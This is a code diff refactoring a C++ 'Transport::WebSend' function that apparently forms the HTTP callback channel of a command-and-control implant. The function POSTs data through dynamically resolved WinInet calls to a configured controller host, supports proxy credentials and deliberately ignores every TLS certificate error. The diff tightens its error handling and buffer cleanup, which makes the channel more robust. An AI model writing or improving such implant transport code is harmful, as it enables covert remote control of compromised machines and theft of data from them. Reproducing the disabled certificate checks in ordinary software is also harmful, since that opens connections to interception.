@@ -17,128 +17,135 @@ auto DECLFN Transport::WebSend(
     ULONG  HttpFlags       = 0;
     ULONG  OptFlags        = 0;
 
-    BOOL   Success = 0;
+    BOOL   Success = FALSE;
 
     PVOID  TmpBuffer     = NULL;
     PVOID  RespBuffer    = NULL;
     SIZE_T RespSize      = 0;
     DWORD  BytesRead     = 0;
     UINT32 ContentLength = 0;
-    ULONG  ContentLenLen = sizeof( ContentLength );
+    ULONG  ContentLenLen = sizeof(ContentLength);
 
     ULONG HttpStatusCode = 0;
-    ULONG HttpStatusSize = sizeof( HttpStatusCode );
+    ULONG HttpStatusSize = sizeof(HttpStatusCode);
 
     HttpFlags = INTERNET_FLAG_RELOAD;
 
-    if ( Self->Tsp->Web.ProxyEnabled ) HttpAccessType = INTERNET_OPEN_TYPE_PROXY;
+    if (Self->Tsp->Web.ProxyEnabled)
+        HttpAccessType = INTERNET_OPEN_TYPE_PROXY;
 
-    hSession = Self->Wininet.InternetOpenW(   
+    hSession = Self->Wininet.InternetOpenW(
         Self->Tsp->Web.UserAgent, HttpAccessType,
         Self->Tsp->Web.ProxyUrl, 0, 0
     );
-    if ( !hSession ) { KhDbg( "last error: %d", KhGetError ); goto _KH_END; }
+    if (!hSession) { KhDbg("last error: %d", KhGetError); goto _KH_END; }
 
     hConnect = Self->Wininet.InternetConnectW(
         hSession, Self->Tsp->Web.Host, Self->Tsp->Web.Port,
         Self->Tsp->Web.ProxyUsername, Self->Tsp->Web.ProxyPassword,
         INTERNET_SERVICE_HTTP, 0, 0
     );
-    if ( !hConnect ) { KhDbg( "last error: %d", KhGetError ); goto _KH_END; }
+    if (!hConnect) { KhDbg("last error: %d", KhGetError); goto _KH_END; }
 
-    if ( Self->Tsp->Web.Secure ) {
+    if (Self->Tsp->Web.Secure) {
         HttpFlags |= INTERNET_FLAG_SECURE;
-        OptFlags   = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
-            SECURITY_FLAG_IGNORE_CERT_DATE_INVALID   |
-            SECURITY_FLAG_IGNORE_CERT_CN_INVALID     |
-            SECURITY_FLAG_IGNORE_WRONG_USAGE         |
-            SECURITY_FLAG_IGNORE_WEAK_SIGNATURE;
-    }        
+        OptFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
+                   SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
+                   SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
+                   SECURITY_FLAG_IGNORE_WRONG_USAGE |
+                   SECURITY_FLAG_IGNORE_WEAK_SIGNATURE;
+    }
 
-    hRequest = Self->Wininet.HttpOpenRequestW( 
-        hConnect, L"POST", Self->Tsp->Web.EndPoint, NULL, 
-        NULL, NULL, HttpFlags, 0 
+    hRequest = Self->Wininet.HttpOpenRequestW(
+        hConnect, L"POST", Self->Tsp->Web.EndPoint, NULL,
+        NULL, NULL, HttpFlags, 0
     );
-    if ( !hRequest ) { KhDbg( "last error: %d", KhGetError ); goto _KH_END; }
+    if (!hRequest) { KhDbg("last error: %d", KhGetError); goto _KH_END; }
 
-    Self->Wininet.InternetSetOptionW( hRequest, INTERNET_OPTION_SECURITY_FLAGS, &OptFlags, sizeof( OptFlags ) );
+    Self->Wininet.InternetSetOptionW(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &OptFlags, sizeof(OptFlags));
 
     Success = Self->Wininet.HttpSendRequestW(
         hRequest, Self->Tsp->Web.HttpHeaders,
-        Str::LengthW( Self->Tsp->Web.HttpHeaders ),
+        Str::LengthW(Self->Tsp->Web.HttpHeaders),
         Data, Size
     );
-    if ( !Success ) { KhDbg( "last error: %d", KhGetError ); goto _KH_END; }
+    if (!Success) { KhDbg("last error: %d", KhGetError); goto _KH_END; }
 
     Self->Wininet.HttpQueryInfoW(
         hRequest, HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER,
         &HttpStatusCode, &HttpStatusSize, NULL
     );
 
-    KhDbg( "http status code %d", HttpStatusCode );
+    KhDbg("http status code %d", HttpStatusCode);
 
-    if ( Success ) {
-        Success = Self->Wininet.HttpQueryInfoW(
-            hRequest, HTTP_QUERY_CONTENT_LENGTH | HTTP_QUERY_FLAG_NUMBER,
-            &ContentLength, &ContentLenLen, NULL
-        );
-        if ( !Success ) { 
-            if ( KhGetError == 12150 ) {
-                KhDbg( "content-length header not found" );
-            } else {
-                KhDbg( "last error: %d", KhGetError );
-            }
-        }
+    Success = Self->Wininet.HttpQueryInfoW(
+        hRequest, HTTP_QUERY_CONTENT_LENGTH | HTTP_QUERY_FLAG_NUMBER,
+        &ContentLength, &ContentLenLen, NULL
+    );
 
-        RespSize = ContentLength;
-        
-        if ( RespSize ) {
-            RespBuffer = PTR( Self->Hp->Alloc( RespSize + 1 ) );
-            Self->Wininet.InternetReadFile( hRequest, RespBuffer, RespSize, &BytesRead );
-        } else {
-            RespSize   = 0;
-            RespBuffer = NULL;
-            TmpBuffer  = PTR( Self->Hp->Alloc( BEG_BUFFER_LENGTH ) );
-
-            do {
-                Self->Wininet.InternetReadFile( hRequest, TmpBuffer, BEG_BUFFER_LENGTH, &BytesRead );
-
-                RespSize += BytesRead;
-
-                if ( !RespBuffer ) {
-                    RespBuffer = PTR( Self->Hp->Alloc( RespSize ) );
-                } else {
-                    RespBuffer = PTR( Self->Hp->ReAlloc( RespBuffer, RespSize ) );
-                }
-
-                Mem::Copy( PTR( U_PTR( RespBuffer ) + ( RespSize - BytesRead ) ), TmpBuffer, BytesRead );
-                Mem::Zero( U_PTR( TmpBuffer ), BytesRead );
-                
-            } while ( BytesRead > 0 );
-
-            if ( TmpBuffer ) {
-                Self->Hp->Free( TmpBuffer );
-            }
-        }
-        
-        if ( RespBuffer ) *RecvData = RespBuffer;
-        if ( RecvSize   ) *RecvSize = RespSize;
-
-        Success = TRUE;            
-    } else {
-        if ( KhGetError == 12029 ) {
-            return FALSE;
-        } else {
-            return TRUE;
-        }
-
-        Success = FALSE;
+    if (!Success && KhGetError == 12150) {
+        KhDbg("content-length header not found");
+        Success = TRUE;
+    } else if ( ! Success ) {
+        KhDbg("last error: %d", KhGetError);
+        goto _KH_END;
     }
 
+    RespSize = ContentLength;
+
+    if (RespSize) {
+        RespBuffer = PTR(Self->Hp->Alloc(RespSize + 1));
+        if (!RespBuffer) goto _KH_END;
+
+        Success = Self->Wininet.InternetReadFile(hRequest, RespBuffer, RespSize, &BytesRead);
+        if (!Success) goto _KH_END;
+    } else {
+        RespSize = 0;
+        RespBuffer = NULL;
+        TmpBuffer = PTR(Self->Hp->Alloc(BEG_BUFFER_LENGTH));
+        if (!TmpBuffer) goto _KH_END;
+
+        do {
+            Success = Self->Wininet.InternetReadFile(hRequest, TmpBuffer, BEG_BUFFER_LENGTH, &BytesRead);
+            if (!Success || BytesRead == 0) break;
+
+            RespSize += BytesRead;
+
+            if (!RespBuffer) {
+                RespBuffer = PTR(Self->Hp->Alloc(RespSize));
+                if (!RespBuffer) goto _KH_END;
+            } else {
+                RespBuffer = PTR(Self->Hp->ReAlloc(RespBuffer, RespSize));
+                if (!RespBuffer) goto _KH_END;
+            }
+
+            Mem::Copy(PTR(U_PTR(RespBuffer) + (RespSize - BytesRead)), TmpBuffer, BytesRead);
+            Mem::Zero(U_PTR(TmpBuffer), BytesRead);
+        } while (BytesRead > 0);
+
+        if (TmpBuffer) {
+            Self->Hp->Free(TmpBuffer);
+            TmpBuffer = NULL;
+        }
+    }
+
+    if (RespBuffer && RecvData) *RecvData = RespBuffer;
+    if (RecvSize) *RecvSize = RespSize;
+
+    Success = TRUE;
+
 _KH_END:
-    if ( hSession ) Self->Wininet.InternetCloseHandle( hSession );
-    if ( hConnect ) Self->Wininet.InternetCloseHandle( hConnect );
-    if ( hRequest ) Self->Wininet.InternetCloseHandle( hRequest );
+    if (!Success && RespBuffer) {
+        Self->Hp->Free(RespBuffer);
+        RespBuffer = NULL;
+    }
+
+    if (TmpBuffer)
+        Self->Hp->Free(TmpBuffer);
+
+    if (hRequest) Self->Wininet.InternetCloseHandle(hRequest);
+    if (hConnect) Self->Wininet.InternetCloseHandle(hConnect);
+    if (hSession) Self->Wininet.InternetCloseHandle(hSession);
 
     return Success;
 }
